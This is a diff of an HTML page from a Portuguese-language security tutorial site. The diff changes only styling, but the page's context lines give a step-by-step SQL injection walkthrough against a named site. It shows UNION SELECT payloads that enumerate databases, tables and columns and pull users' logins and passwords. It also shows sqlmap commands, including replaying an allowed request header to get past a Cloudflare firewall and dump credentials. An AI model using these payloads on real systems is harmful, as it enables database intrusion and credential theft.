@@ -11,15 +11,15 @@
     <link rel="stylesheet" href="../../estilo.css">
     <title>UB Social</title>
 </head>
-<body id="fundo">
+<body>
 <div class="container-fluid">
 
 
     <div class="row">
         <div class="col-sm-12" id="menu">
-            <nav class="navbar fixed-top navbar-expand-lg navbar-dark bg-dark shadow" id="navMenu">
+            <nav class="navbar fixed-top navbar-expand-lg navbar-light bg-light shadow">
                 <div class="container-fluid">
-                    <a class="navbar-brand" href="../../index.html"><img src="../../anexos/icons/logoBranco.png" class="d-inline-block align-text-top" id="logo"> UB Social</a>
+                    <a class="navbar-brand" href="../../index.html"><img src="../../anexos/icons/logo.png" class="d-inline-block align-text-top" id="logo"> UB Social</a>
                     <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button>
                     <div class="collapse navbar-collapse" id="navbarNav">
                         <ul class="navbar-nav">
@@ -46,13 +46,13 @@
             <br>
             <h4>Quantas colunas possuem a table do site</h4>
             <p id="textoPost">Ir trocando o 1 (nº da coluna da table) no final até dar um erro SQL na página, para descobrir quantas colunas possuem a tabela representada. Atenção, não são as linhas, mas sim as colunas de uma table:</p>
-<small><pre id="codigo"><code>
+<small><pre><code>
 www.bancocn.com/cat.php?id=1 order by 1--
 </code></pre></small>
             <br>
             <h4>Concatenar Selects</h4>
             <p id="textoPost">Cria-se, após fazer o 1º select, um novo 'select', no caso abaixo, com 3 colunas, sendo especificado o valor 1 na primeira coluna, 2 na segunda e 3 na terceira. Caso colocarmos um 4 após o 3, ocorrerá o mesmo erro que o acima, informando que não existe uma quarta coluna. Pode-se trocar os nºs por outros dados, como Strings.</p>
-<small><pre id="codigo"><code>
+<small><pre><code>
 www.bancocn.com/cat.php?id=1 union select 1, 2, 3
 www.bancocn.com/cat.php?id=-1 union select 1, 2, 3 (Ver conteúdo da 3ª coluna)
 www.bancocn.com/cat.php?id=-1 union select 1, 2, database() //nome do database
@@ -60,7 +60,7 @@ www.bancocn.com/cat.php?id=-1 union select 1, 2, database() //nome do database
             <br>
             <h4>Database padrão MySQL</h4>
             <p id="textoPost">Dentro da table schemata estão os nomes dos Databases existentes (schema_name). Schema é o mesmo que Database. No caso, existem mais Databases cadastrados, porém o usuário de acesso do Database não possui permissões de acesso.</p>
-<small><pre id="codigo"><code>
+<small><pre><code>
 www.bancocn.com/cat.php?id=-1 union select 1, 2, group_concat(schema_name) from information_schema.schemata
 <b>Nome das tables:</b>
 www.bancocn.com/cat.php?id=-1 union select 1, 2, group_concat(table_name) from information_schema.tables where table_schema="bancocn"
@@ -69,7 +69,7 @@ www.bancocn.com/cat.php?id=-1 union select 1, 2, group_concat(column_name) from 
 </code></pre></small>
             <br>
             <h4>Dados das Columns</h4>
-<small><pre id="codigo"><code>
+<small><pre><code>
 www.bancocn.com/cat.php?id=-1 union select 1, 2, login from bancocn.users
 www.bancocn.com/cat.php?id=-1 union select 1, 2, group_concat(id, " ", login, " ", password) from bancocn.users
 </code></pre></small>
@@ -78,11 +78,11 @@ www.bancocn.com/cat.php?id=-1 union select 1, 2, group_concat(id, " ", login, " 
             <p id="textoPost">Site https://hashes.com/en/decrypt/hash</p>
             <br>
             <h4>Sqlmap</h4>
-<small><pre id="codigo"><code>
+<small><pre><code>
 sqlmap -u http://www.bancocn.com/cat.php?id=3 --dbs --dbms=mysql
 </code></pre></small>
             <p id="textoPost">Ocorrerá um erro 403, pois o firewall Cloudflare barra a ferramenta. A solução para tal é inserir um Request Header que já fora autorizado pelo firewall, e salvá-lo em um arquivo txt (no caso, header.txt, imagem abaixo). Após isso, utiliza-se o seguinte comando.</p>
-<small><pre id="codigo"><code>
+<small><pre><code>
 sqlmap -r lista.txt --dbs --dbms=mysql
 </code></pre></small>
             <img src="../anexos/sqlInjection/header.png" width="800px" class="img-fluid">
@@ -91,7 +91,7 @@ sqlmap -r lista.txt --dbs --dbms=mysql
             <br><br>
             <img src="../anexos/sqlInjection/sqlmap.png" width="400px" class="img-fluid">
             <br><br>
-<small><pre id="codigo"><code>
+<small><pre><code>
 <b>Nome das tables:</b>
 sqlmap -r lista.txt --dbms=mysql -D bancocn --tables
 <b>Columns da table:</b>
@@ -111,7 +111,7 @@ sqlmap -r lista.txt --dbms=mysql -D bancocn -T users -C login,password --dump
 
 <!--Rodapé-->
 <div class="row">
-    <div class="col-sm-12 text-center bg-dark" id="rodape">
+    <div class="col-sm-12 text-center" id="rodape">
         <p>Elaborado por Mateus Schwede<br><small>ubsocial.github.io</small></p>
     </div>
 </div>
